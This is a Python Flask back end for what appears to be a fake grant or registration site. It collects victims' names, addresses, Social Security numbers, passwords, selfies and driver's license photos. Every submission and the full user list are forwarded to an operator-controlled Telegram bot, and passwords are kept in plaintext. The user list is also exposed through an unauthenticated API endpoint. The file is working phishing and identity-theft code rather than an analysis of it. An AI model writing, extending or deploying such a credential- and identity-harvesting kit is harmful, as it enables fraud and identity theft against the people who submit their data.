import json
import os
from datetime import datetime
from urllib import error as urllib_error
from urllib import request as urllib_request

import requests
from flask import Flask, render_template, request, jsonify, redirect

app = Flask(__name__, template_folder='.', static_folder='.')

BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '').strip()
CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '').strip()

users = []


def format_user_details(user):
    fields = [
        ('Full Name', user.get('FullName')),
        ('Email', user.get('Email')),
        ('Phone', user.get('Phone')),
        ('City', user.get('City')),
        ('State', user.get('State')),
        ('Zip Code', user.get('ZipCode')),
        ('Country', user.get('Country')),
        ('Address', user.get('Address')),
        ('Age', user.get('Age')),
        ('SSN', user.get('SSN')),
        ('Terms Accepted', user.get('Terms')),
    ]
    details = []
    for label, value in fields:
        if value is not None and value != '':
            details.append(f'{label}: {value}')
    return '\n'.join(details) if details else 'No details provided'


def send_telegram_photo(file_storage, caption=''):
    if not BOT_TOKEN or not CHAT_ID:
        return False

    try:
        response = requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto',
            data={'chat_id': CHAT_ID, 'caption': caption},
            files={'photo': (file_storage.filename, file_storage.read(), file_storage.mimetype or 'image/jpeg')},
            timeout=20,
        )
        return response.ok
    except Exception as exc:
        print(f'Telegram photo send failed: {exc}')
        return False


def send_telegram_message(text, files=None):
    if not BOT_TOKEN or not CHAT_ID:
        return False

    telegram_url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    payload = json.dumps({
        'chat_id': CHAT_ID,
        'text': text,
        'parse_mode': 'HTML',
        'disable_web_page_preview': True,
    }).encode('utf-8')

    try:
        req = urllib_request.Request(
            telegram_url,
            data=payload,
            headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
            method='POST',
        )
        with urllib_request.urlopen(req, timeout=15) as response:
            success = response.status == 200
    except (urllib_error.URLError, TimeoutError, ValueError) as exc:
        print(f'Telegram send failed: {exc}')
        success = False

    if files:
        photo_results = []
        for file_storage in files:
            caption = file_storage.filename or 'Uploaded image'
            photo_results.append(send_telegram_photo(file_storage, caption))
        return success or any(photo_results)

    return success


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/register')
def register():
    return render_template('register.html')


@app.route('/register.html')
def register_html():
    return render_template('register.html')


@app.route('/success')
def success():
    return render_template('success.html')


@app.route('/success.html')
def success_html():
    return render_template('success.html')


# NEW GRANT PAGE
@app.route('/grant-dashboard')
def grant_dashboard():
    return render_template('grant-dashboard.html')


@app.route('/users')
def users_page():
    return render_template('getusers.html')


@app.route('/getusers.html')
def users_html():
    return render_template('getusers.html')
@app.route('/index.html')
def index_html():
    return render_template('index.html')


@app.route('/register', methods=['POST'])
def submit_register():
    full_name = request.form.get('FullName') or request.form.get('fullName') or ''
    email = request.form.get('Email') or request.form.get('email') or ''
    phone = request.form.get('Phone') or request.form.get('phone') or ''

    profile_photo = request.files.get('ProfilePic') or request.files.get('profilePhoto')
    license_photo = request.files.get('DriversLicense[]') or request.files.get('driversLicense') or request.files.get('DriversLicense')

    text = f"""
New Registration

Name: {full_name}
Email: {email}
Phone: {phone}
"""

    send_telegram_message(text)

    if profile_photo and profile_photo.filename:
        send_telegram_photo(profile_photo, f'Profile photo for {full_name or "new user"}')

    if license_photo and license_photo.filename:
        send_telegram_photo(license_photo, f"Driver's license for {full_name or 'new user'}")

    return redirect('/success')


@app.route('/api/register', methods=['POST'])
def register_user():
    data = request.get_json(silent=True)
    uploaded_files = []

    if data is None:
        data = request.form.to_dict()

    if request.files:
        for key in request.files:
            for file_storage in request.files.getlist(key):
                if file_storage and file_storage.filename:
                    uploaded_files.append(file_storage)

    if not data and not uploaded_files:
        return jsonify({'error': 'No form data received'}), 400

    required_fields = ['FullName', 'Email', 'Password', 'City', 'State']
    missing = [field for field in required_fields if not str(data.get(field, '')).strip()]
    if missing:
        return jsonify({'error': f'Missing required fields: {missing}'}), 400

    email = str(data.get('Email', '')).strip().lower()
    if any(str(user.get('Email', '')).strip().lower() == email for user in users):
        return jsonify({'error': 'User already exists with this email'}), 409

    sanitized_user = {key: value for key, value in data.items()}
    if uploaded_files:
        sanitized_user['UploadedFiles'] = [file_storage.filename for file_storage in uploaded_files]
    users.append(sanitized_user)

    telegram_message = (
        '<b>New user registration</b>\n'
        f'<b>Time:</b> {datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")}\n'
        f'{format_user_details(sanitized_user)}'
    )
    telegram_sent = send_telegram_message(telegram_message, uploaded_files)

    return jsonify({
        'message': 'User registered successfully!',
        'data': sanitized_user,
        'telegram_sent': telegram_sent,
    })


@app.route('/api/login', methods=['POST'])
def login_user():
    data = request.get_json(silent=True)
    if data is None:
        data = request.form.to_dict()

    username = str(data.get('username') or data.get('Email') or '').strip().lower()
    password = str(data.get('password') or data.get('Password') or '')

    if not username or not password:
        return jsonify({'message': 'Username and password are required'}), 400

    user = next((u for u in users if str(u.get('Email', '')).strip().lower() == username and str(u.get('Password', '')) == password), None)
    if user:
        return jsonify({'message': 'Login successful!', 'user': {'FullName': user.get('FullName', '')}})

    return jsonify({'message': 'Invalid credentials!'}), 401


@app.route('/api/users', methods=['GET'])
def get_users():
    return jsonify(users)


@app.route('/api/telegram/users', methods=['GET'])
def send_users_to_telegram():
    if not users:
        return jsonify({'message': 'No users yet to send to Telegram'}), 200

    lines = ['<b>All registered users</b>']
    for index, user in enumerate(users, start=1):
        lines.append(f'\n<b>{index}. {user.get("FullName", "Unknown")}</b>')
        lines.append(format_user_details(user))
        lines.append('---')

    sent = send_telegram_message('\n'.join(lines))
    return jsonify({'message': 'Telegram update sent' if sent else 'Telegram not configured or request failed', 'telegram_sent': sent})


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)

